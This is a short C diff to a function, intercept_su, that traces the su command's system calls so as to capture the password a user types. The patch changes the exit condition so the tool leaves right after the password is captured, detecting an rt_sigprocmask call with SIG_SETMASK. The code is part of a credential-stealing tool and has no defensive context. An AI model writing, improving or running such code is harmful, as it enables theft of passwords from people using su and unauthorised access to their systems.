@@ -25,6 +25,7 @@ void intercept_su(pid_t traced_process) {
   int syscall = 0;
   int fd = 0;
   int i = 0;
+  int how = 0;
   long read_length = 0;
   long length = 0;
   char *read_string = NULL;
@@ -52,10 +53,14 @@ void intercept_su(pid_t traced_process) {
 
     syscall = get_syscall(traced_process);
 
-    // When su is ready to create it's child process, the authentication
-    // process has finished
-    if (syscall == SYSCALL_clone)
-      goto exit_su;
+    // su calls rt_sigprocmask with SIG_SETMASK immediately after the
+    // password is captured
+    if (syscall == SYSCALL_rt_sigprocmask) {
+      how = get_syscall_arg(traced_process, 0);
+      if (how == SIG_SETMASK) {
+        goto exit_su;
+      }
+    }
 
     if (wait_for_syscall(traced_process) != 0)
       break;
